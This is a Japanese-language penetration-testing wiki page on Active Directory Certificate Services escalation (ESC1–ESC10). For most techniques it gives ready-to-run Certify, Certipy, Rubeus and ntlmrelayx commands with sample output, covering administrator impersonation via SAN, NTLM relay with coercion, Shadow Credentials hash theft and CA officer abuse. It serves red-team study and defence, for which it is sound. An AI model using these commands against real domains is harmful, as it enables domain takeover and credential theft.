# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**これは、記事の escalation technique セクションの要約です:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 の説明

- **Enterprise CA によって、低権限ユーザーに Enrolment 権限が付与されている。**
- **Manager の承認が不要である。**
- **承認された担当者からの署名が不要である。**
- **Certificate Templates の Security Descriptor が過度に寛容であり、低権限ユーザーが Enrolment 権限を取得できる。**
- **Certificate Templates が、authentication を可能にする EKU を定義するよう設定されている:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) identifier が含まれている。
- **requester が Certificate Signing Request (CSR) に subjectAltName を含めることが Template によって許可されている:**
- Active Directory (AD) は、証明書に subjectAltName (SAN) が存在する場合、identity verification においてそれを優先する。つまり、CSR で SAN を指定することで、任意のユーザー（例: domain administrator）になりすますための証明書を要求できる。requester が SAN を指定できるかどうかは、Certificate Template の AD object にある `mspki-certificate-name-flag` property によって示される。この property は bitmask であり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag が存在すると、requester による SAN の指定が許可される。

> [!CAUTION]
> この設定により、低権限ユーザーは任意の SAN を持つ証明書を要求でき、Kerberos または SChannel を通じて任意の domain principal として authentication できる。

この機能は、products や deployment services が HTTPS または host certificate をオンザフライで生成できるようにするため、あるいは理解不足によって有効化されることがある。

このオプションを使用して証明書を作成すると warning が表示される。ただし、既存の Certificate Template（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効な `WebServer` Template など）を duplicate し、その後 authentication OID を含めるよう変更した場合には warning は表示されない。<sup>[[6]](#references)</sup>

### Abuse

**vulnerable certificate templates を見つける**には、次を実行する:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**この脆弱性を悪用して管理者になりすますには**、次を実行します:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
その後、生成された **certificate を `.pfx`** 形式に変換し、それを使用して再び **Rubeus または certipy で認証**できます：<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows のバイナリである "Certreq.exe" と "Certutil.exe" を使用して PFX を生成できます: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest の構成スキーマ内にある証明書テンプレートのうち、承認や署名を必要とせず、Client Authentication または Smart Card Logon EKU を持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが有効になっているものは、次の LDAP クエリを実行することで列挙できます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

2つ目のabuse scenarioは、1つ目のバリエーションです。

1. Enrollment rightsが、Enterprise CAによってlow-privileged usersに付与されている。
2. Manager approvalの要件が無効化されている。
3. Authorized signaturesの必要性が省略されている。
4. Certificate templateの過度に許容的なsecurity descriptorにより、low-privileged usersにcertificate enrollment rightsが付与されている。
5. **Certificate templateにAny Purpose EKUまたはEKUなしが含まれるよう定義されている。**

**Any Purpose EKU**により、attackerはclient authentication、server authentication、code signingなど、**あらゆる目的**で使用できるcertificateを取得できます。このscenarioのexploitには、**ESC3で使用されたtechnique**をそのまま利用できます。

**EKUなし**のcertificatesはsubordinate CA certificatesとして機能し、**あらゆる目的**で悪用でき、**新しいcertificatesの署名にも使用できます**。そのため、attackerはsubordinate CA certificateを利用して、新しいcertificatesに任意のEKUやfieldsを指定できます。

ただし、subordinate CAが**`NTAuthCertificates`** objectから信頼されていない場合、**domain authentication**用に作成された新しいcertificatesは機能しません。これはデフォルト設定です。それでもattackerは、**任意のEKU**と任意のcertificate valuesを持つ**新しいcertificates**を作成できます。これらは、code signing、server authenticationなど、幅広い目的で**悪用される可能性**があり、SAML、AD FS、IPSecなど、network上の他のapplicationsにも重大な影響を及ぼす可能性があります。<sup>[[6]](#references)</sup>

AD Forestのconfiguration schema内でこのscenarioに一致するtemplatesをenumerateするには、次のLDAP queryを実行できます:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 設定ミスのある Enrollment Agent Templates - ESC3

### 説明

このシナリオは最初と2番目のシナリオに似ていますが、**異なる EKU**（Certificate Request Agent）と**2つの異なるテンプレート**を**悪用**します（そのため、要件も2組あります）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、プリンシパルが**別のユーザーに代わって** **certificate** に**enroll**できるようにします。

**「Enrollment Agent」**はこのような**テンプレート**に**enroll**し、取得した**certificate**を使用して、別のユーザーに代わって CSR に**共同署名**します。その後、**共同署名された CSR**を CA に**送信**し、「別のユーザーに代わって enroll」を許可する**テンプレート**に**enroll**します。CA は「別の」ユーザーに属する**certificate**を返します。<sup>[[6]](#references)</sup>

**要件 1:**

- Enterprise CA により、低権限ユーザーに enrollment 権限が付与されている。
- マネージャー承認の要件が省略されている。
- authorized signatures の要件がない。
- certificate template の security descriptor が過度に permissive で、低権限ユーザーに enrollment 権限を付与している。
- certificate template に Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって他の certificate templates を要求できる。

**要件 2:**

- Enterprise CA が低権限ユーザーに enrollment 権限を付与している。
- マネージャー承認が bypass されている。
- template の schema version が 1 または 2 より大きく、Certificate Request Agent EKU を必要とする Application Policy Issuance Requirement が指定されている。
- certificate template で定義された EKU により、domain authentication が許可されている。
- CA で Enrollment Agent に対する制限が適用されていない。

### Abuse

[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用して、このシナリオを**悪用**できます。<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** の **取得**を許可されている **users**、**agents** による **enrollment** が許可されているテンプレート、および enrollment agent が代理として動作できる **accounts** は、enterprise CA によって制限できます。これは、`certsrc.msc` **snap-in** を開き、**CA を右クリック**して **Properties** をクリックし、「Enrollment Agents」タブに **移動**することで設定します。

ただし、CA の **default** 設定は「**Do not restrict enrollment agents**」である点に注意が必要です。管理者が enrollment agents の制限を有効化し、「Restrict enrollment agents」に設定した場合でも、default configuration は依然として非常に permissive です。これにより、**Everyone** がすべてのテンプレートに、任意のユーザーとして enrollment することを許可します。

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** の **security descriptor** は、そのテンプレートに対して特定の **AD principals** が保有する **permissions** を定義します。

**attacker** が **template** を **alter** し、**prior sections** で説明した **exploitable misconfigurations** のいずれかを **institute** するために必要な **permissions** を保有している場合、privilege escalation が可能になります。

certificate templates に適用される主な permissions は次のとおりです。<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙的な control を付与し、任意の attributes を変更できるようにします。
- **FullControl:** 任意の attributes の変更を含め、オブジェクトに対する完全な権限を付与します。
- **WriteOwner:** オブジェクトの owner を、attacker が control する principal に変更できます。
- **WriteDacl:** access controls を調整でき、attacker に FullControl を付与する可能性があります。
- **WriteProperty:** 任意の object properties を編集できます。

### Abuse

templates およびその他の PKI objects に対する edit rights を持つ principals を特定するには、Certify で enumerate します。
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
前のものと同様の privesc の例です：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 は、ユーザーが certificate template に対する write privileges を持っている場合です。これは、certificate template の設定を上書きして、その template を ESC1 に対して脆弱にすることで悪用できます。

上のパスからわかるように、これらの privileges を持っているのは `JOHNPC` だけですが、ユーザー `JOHN` には `JOHNPC` への新しい `AddKeyCredentialLink` edge があります。この technique は certificates に関連しているため、この攻撃も実装しました。これは [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) として知られています。<sup>[[8]](#references)</sup> 以下は、被害者の NT hash を取得するための Certipy の `shadow auto` command の簡単な sneak peak です。
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** は、1つのコマンドで証明書テンプレートの構成を上書きできます。**デフォルト**では、Certipy は構成を上書きして **ESC1 に対して脆弱な状態**にします。また、**`-save-old` パラメーターを指定して以前の構成を保存**することもできます。これは、攻撃後に構成を**復元**する際に役立ちます。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## 脆弱な PKI Object Access Control - ESC5

### Explanation

証明書テンプレートや Certification Authority 以外の複数のオブジェクトを含む、相互接続された ACL ベースの関係の広範なネットワークは、AD CS システム全体のセキュリティに影響を与える可能性があります。セキュリティに大きな影響を及ぼすこれらのオブジェクトには、次のものが含まれます。

- S4U2Self や S4U2Proxy などのメカニズムによって侵害される可能性がある、CA server の AD computer object。
- CA server の RPC/DCOM server。
- 特定のコンテナーパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、あらゆる子孫 AD object または container。このパスには、Certificate Templates container、Certification Authorities container、NTAuthCertificates object、Enrollment Services Container などの containers や objects が含まれますが、これらに限定されません。

低権限の attacker がこれらの重要なコンポーネントのいずれかを制御できると、PKI システムのセキュリティが侵害される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) で取り上げられている内容では、Microsoft が説明している **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の影響についても触れています。この設定を Certification Authority (CA) で有効にすると、Active Directory® から構築されたものを含む**あらゆる request**で、**user-defined values** を **subject alternative name** に含めることが可能になります。その結果、この機能によって、domain **authentication** 用に設定された**あらゆる template**、特に標準の User template のように、**unprivileged** user による enrollment が許可されている template を介して、**intruder** が enrollment できるようになります。これにより、certificate を取得し、intruder が domain administrator または domain 内の**その他の有効な entity**として authenticate できるようになります。<sup>[[9]](#references)</sup>

**Note**: `certreq.exe` の `-attrib "SAN:"` argument（「Name Value Pairs」と呼ばれます）を使用して Certificate Signing Request (CSR) に **alternative names** を追加する方法は、ESC1 における SAN の exploitation strategy とは異なります。ここでの違いは、account information がどのようにカプセル化されるかにあります。つまり、extension 内ではなく certificate attribute 内に格納されます。

### Abuse

設定が有効になっているか確認するには、組織は `certutil.exe` を使用して次の command を実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
この操作は本質的に **remote registry access** を利用するため、別のアプローチとしては次のようなものが考えられます：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) や [**Certipy**](https://github.com/ly4k/Certipy) などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていることを前提として、以下のコマンドを任意のワークステーションから実行できます。
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
環境でこの設定を無効にするには、次のコマンドでフラグを削除できます:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022年5月のセキュリティ更新後に新しく発行される **certificates** には、**requester の `objectSid` property** を組み込んだ **security extension** が含まれます。ESC1では、このSIDは指定されたSANから派生します。一方、**ESC6**では、SIDはSANではなく **requester の `objectSid`** を反映します。\
> ESC6をexploitするには、**SANよりも新しいsecurity extensionを優先する** ESC10（Weak Certificate Mappings）にシステムが脆弱であることが不可欠です。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

certificate authorityのアクセス制御は、CAのアクションを管理する一連の権限によって維持されています。これらの権限は、`certsrv.msc`にアクセスし、CAを右クリックしてPropertiesを選択し、Securityタブに移動することで確認できます。さらに、PSPKI moduleを使用し、次のようなcommandsで権限をenumerateできます：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
これは、主な権限である **`ManageCA`** と **`ManageCertificates`** についての洞察を提供します。これらはそれぞれ「CA administrator」と「Certificate Manager」の役割に対応します。<sup>[[6]](#references)</sup>

#### Abuse

証明機関に対する **`ManageCA`** 権限を持つ principal は、PSPKI を使用してリモートから設定を操作できます。これには、任意の template で SAN の指定を許可する **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag の切り替えが含まれ、これは domain escalation における重要な要素です。

このプロセスは、PSPKI の **Enable-PolicyModuleFlag** cmdlet を使用することで簡略化でき、GUI を直接操作せずに変更できます。

**`ManageCertificates`** 権限を持つことで、保留中のリクエストを承認でき、「CA certificate manager approval」という safeguard を事実上回避できます。

**Certify** と **PSPKI** modules を組み合わせることで、certificate のリクエスト、承認、ダウンロードを実行できます：
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> **前の攻撃**では、**`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを **有効化**し、**ESC6 attack** を実行しましたが、CA service (`CertSvc`) が再起動されるまで効果はありません。ユーザーが `Manage CA` access right を持っている場合、そのユーザーには **service を再起動する権限**も与えられます。ただし、これはユーザーが **remote で service を再起動できる**ことを意味しません。さらに、2022 年 5 月の security updates により、ほとんどの patched environments では、E**SC6 が out of the box で動作しない可能性があります**。

そのため、ここでは別の攻撃を紹介します。

前提条件:

- **`ManageCA` permission** のみ
- **`Manage Certificates` permission**（**`ManageCA`** から付与可能）
- Certificate template **`SubCA`** が **enabled** であること（**`ManageCA`** から enabled にできます）

この technique は、`Manage CA` _and_ `Manage Certificates` access right を持つユーザーが、**failed certificate requests を発行できる**という事実を利用します。**`SubCA`** certificate template は **ESC1 に対して vulnerable** ですが、template に enroll できるのは **administrators のみ**です。したがって、**user** は **`SubCA`** への enroll を **request** できます。この request は **denied** されますが、**その後 manager によって発行されます**。<sup>[[6]](#references)</sup>

#### Abuse

新しい officer として自分の user を追加することで、**自分に `Manage Certificates`** access right を **grant** できます。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template は、`-enable-template` パラメーターを使用して **CA** で **有効化**できます。デフォルトでは、`SubCA` template は有効になっています。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
この攻撃の前提条件を満たしている場合、まず **`SubCA` template に基づく certificate をリクエスト**します。

**このリクエストは拒否され**ますが、private key を保存し、request ID を控えておきます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` と `Manage Certificates`** を使用すると、`ca` コマンドに `-issue-request <request ID>` パラメーターを指定して、**失敗した証明書**リクエストを発行できます。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最後に、`req`コマンドと`-retrieve <request ID>`パラメーターを使用して、**発行された証明書を取得**できます。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 攻撃 3 – Manage Certificates Extension Abuse (SetExtension)

#### 説明

従来の ESC7 abuse（EDITF 属性の有効化や保留中のリクエストの承認）に加えて、**Certify 2.0** により、Enterprise CA 上の *Manage Certificates*（別名 **Certificate Manager / Officer**）role だけを必要とする、まったく新しい primitive が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method は、*Manage Certificates* を保持する任意の principal によって実行できます。この method は従来、正規の CA が**保留中**のリクエストの extension を更新するために使用していました。しかし attacker はこれを abuse して、承認待ちのリクエストに *non-default* の certificate extension（例: `1.1.1.1` のような custom *Certificate Issuance Policy* OID）を**追加**できます。

対象の template がその extension の default value を**定義していない**場合、リクエストが最終的に発行される際に CA が attacker によって制御された value を上書きすることはありません。そのため、生成された certificate には attacker が選択した extension が含まれ、次のような用途に利用できます。

* 他の vulnerable template の Application / Issuance Policy 要件を満たす（privilege escalation につながる）。
* third-party system で certificate に予期しない trust を与える追加の EKU や policy を注入する。

要するに、従来 ESC7 の「より強力でない」側と考えられていた *Manage Certificates* は、CA configuration に触れたり、より制限の厳しい *Manage CA* right を必要としたりすることなく、完全な privilege escalation または長期的な persistence に利用できるようになりました。

#### Certify 2.0 による primitive の abuse

1. **保留状態のままになる certificate request を submit する。** manager approval を必要とする template を使うことで、これを強制できます。
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 新しい `manage-ca` command を使用して、保留中の request に custom extension を**追加**する。
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*template がすでに *Certificate Issuance Policies* extension を定義していない場合、上記の value は発行後も保持されます。*

3. request を**発行**する（role に *Manage Certificates* approval rights もある場合）か、operator が承認するまで待つ。発行されたら certificate を download する。
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 生成された certificate には悪意のある issuance-policy OID が含まれるため、後続の attack（例: ESC13、domain escalation など）に使用できます。

> NOTE:  同じ attack は、`ca` command と `-set-extension` parameter を使用して Certipy ≥ 4.7 でも実行できます。

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 説明

> [!TIP]
> **AD CS が install されている** environment で、**vulnerable な web enrollment endpoint が存在**し、さらに少なくとも 1 つの certificate template が **domain computer enrollment と client authentication を許可**して公開されている場合（default の **`Machine`** template など）、spooler service が active な**任意の computer が attacker によって compromise される可能性があります**。

AD CS は複数の **HTTP-based enrollment method** をサポートしており、これらは administrator が install できる追加の server role によって提供されます。HTTP-based certificate enrollment 用のこれらの interface は、**NTLM relay attack** の影響を受けます。attacker は、**compromised machine から inbound NTLM によって authentication する任意の AD account を impersonate できます**。victim account を impersonate している間、attacker はこれらの web interface に access し、`User` または `Machine` certificate template を使用して client authentication certificate を request できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP application）は、default で HTTP のみを使用するため、NTLM relay attack に対する protection がありません。さらに、Authorization HTTP header を通じた NTLM authentication のみを明示的に許可しているため、Kerberos などのより secure な authentication method は利用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、default で Authorization HTTP header を介した negotiate authentication をサポートします。Negotiate authentication は Kerberos と **NTLM の両方**をサポートするため、attacker は relay attack 中に authentication を **NTLM に downgrade**できます。これらの web service は default で HTTPS を有効にしますが、HTTPS だけでは NTLM relay attack から保護されません。HTTPS service を NTLM relay attack から保護するには、HTTPS と channel binding の組み合わせが必要です。残念ながら、AD CS は IIS 上で channel binding に必要な Extended Protection for Authentication を有効化していません。<sup>[[6]](#references)</sup>

NTLM relay attack における一般的な **issue** は、NTLM session の**短い duration**と、**NTLM signing を必要とする**service と attacker が interact できないことです。

しかし、この limitation は、NTLM relay attack を abuse して user の certificate を取得することで克服できます。certificate の validity period が session の duration を決定し、その certificate は **NTLM signing を mandate する**service でも使用できるためです。盗まれた certificate の使用方法については、以下を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attack のもう 1 つの limitation は、**attacker が制御する machine が victim account によって authentication される必要がある**ことです。attacker は待機するか、この authentication を**強制**しようとすることができます。


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) の `cas` は、**enabled な HTTP AD CS endpoint** を enumerate します。<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` プロパティは、エンタープライズ Certificate Authority (CA) が Certificate Enrollment Service (CES) のエンドポイントを保存するために使用します。これらのエンドポイントは、**Certutil.exe** ツールを使用して解析および一覧表示できます。
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certifyを使った悪用
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) による Abuse

証明書のリクエストは、デフォルトで `Machine` または `User` テンプレートに基づいて Certipy によって実行されます。これは、relay されるアカウント名が `$` で終わるかどうかによって決定されます。別のテンプレートを指定するには、`-template` パラメータを使用します。

次に、[PetitPotam](https://github.com/ly4k/PetitPotam) のような technique を使用して、authentication を強制できます。domain controllers を扱う場合は、`-template DomainController` の指定が必要です。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

**ESC9** と呼ばれる **`msPKI-Enrollment-Flag`** の新しい値 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) は、証明書への **新しい `szOID_NTDS_CA_SECURITY_EXT` security extension** の埋め込みを防止します。この flag は、**`StrongCertificateBindingEnforcement`** が `2` ではなく `1`（デフォルト設定）に設定されている場合に関係します。ESC9 が存在しない場合は要件が変わらないため、Kerberos または Schannel に対するより弱い certificate mapping が悪用される可能性があるシナリオ（ESC10 など）では、その重要性が高まります。<sup>[[7]](#references)</sup>

この flag の設定が重要になる条件は次のとおりです。

- `StrongCertificateBindingEnforcement` が `2` に変更されていない（デフォルトは `1`）、または `CertificateMappingMethods` に `UPN` flag が含まれている。
- 証明書の `msPKI-Enrollment-Flag` 設定で、`CT_FLAG_NO_SECURITY_EXTENSION` flag が指定されている。
- 証明書に任意の client authentication EKU が指定されている。
- 別のアカウントを compromise するために、任意のアカウントに対する `GenericWrite` 権限が利用できる。

### Abuse Scenario

`John@corp.local` が `Jane@corp.local` に対する `GenericWrite` 権限を持っており、`Administrator@corp.local` を compromise することを目的としているとします。`Jane@corp.local` が enroll できる `ESC9` certificate template は、`msPKI-Enrollment-Flag` 設定で `CT_FLAG_NO_SECURITY_EXTENSION` flag が有効になっています。

まず、`John` の `GenericWrite` を利用した Shadow Credentials により、`Jane` の hash を取得します。
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
続いて、`Jane` の `userPrincipalName` は、`@corp.local` ドメイン部分を意図的に省略して `Administrator` に変更されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
この変更は、`Administrator@corp.local` が `Administrator` の `userPrincipalName` として別個に維持されるため、制約に違反しません。

これに続いて、脆弱性ありとしてマークされた `ESC9` certificate template が `Jane` として要求されます。
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
証明書の `userPrincipalName` には `Administrator` が反映されており、“object SID” が含まれていないことに注目してください。

その後、`Jane` の `userPrincipalName` は元の `Jane@corp.local` に戻されます。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
発行された証明書で認証を試行すると、`Administrator@corp.local` の NT hash が得られます。証明書に domain の指定がないため、コマンドには `-domain <domain>` を含める必要があります。
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Explanation

ドメインコントローラー上の2つのレジストリキーの値がESC10で参照されます。

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 配下の `CertificateMappingMethods` のデフォルト値は `0x18`（`0x8 | 0x10`）です。以前は `0x1F` に設定されていました。
